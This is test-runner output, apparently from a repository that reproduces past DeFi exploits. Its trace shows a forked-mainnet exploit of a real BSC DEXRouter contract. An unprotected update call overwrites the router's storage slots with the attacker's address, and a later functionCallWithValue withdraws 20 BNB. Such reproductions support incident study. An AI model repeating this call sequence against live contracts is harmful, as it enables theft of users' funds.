Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.29s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2023-09/DEXRouter_exp.sol:22:1:
   |
22 | contract ContractTest is Test {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
  --> src/test/2023-09/DEXRouter_exp.sol:47:5:
   |
47 |     fallback(
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
  --> src/test/2023-09/DEXRouter_exp.sol:49:33:
   |
49 |     ) external payable returns (bytes memory) {
   |                                 ^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 495.97ms (3.82ms CPU time)

Ran 1 test for src/test/2023-09/DEXRouter_exp.sol:ContractTest
[PASS] testExploit() (gas: 45365)
Logs:
  Attacker BNB balance before exploit: 0.000000000000000000
  Attacker BNB balance after exploit: 20.000000000000000000

Traces:
  [4375] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("bsc", 32161325 [3.216e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(DEXRouter: [0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7], "DEXRouter")
    │   └─ ← [Return]
    └─ ← [Stop]

  [45365] ContractTest::testExploit()
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker BNB balance before exploit", val: 0, decimals: 18)
    ├─ [21671] DEXRouter::update(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [688] ContractTest::e44a73b7(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─  storage changes:
    │   │   @ 2: 0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   @ 3: 0x0000000000000000000000000000000000004946c0e9f43f4dee607b0ef1fa1c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   @ 1: 0x000000000000000000000000a025f4e855ac654d8e80a31ce09c7d7df502ea1d → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   @ 4: 0x000000000000000000000000a2ed9fbd90c518dd1a89ecb2edc497f1de5f6be3 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   └─ ← [Stop]
    ├─ [9648] DEXRouter::functionCallWithValue(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0dbe671f, 20000000000000000000 [2e19])
    │   ├─ [360] ContractTest::a{value: 20000000000000000000}()
    │   │   └─ ← [Return] true
    │   ├─ [688] ContractTest::e44a73b7(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ emit log_named_decimal_uint(key: "Attacker BNB balance after exploit", val: 20000000000000000000 [2e19], decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.89s (1.30s CPU time)

Ran 2 test suites in 3.74s (3.38s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
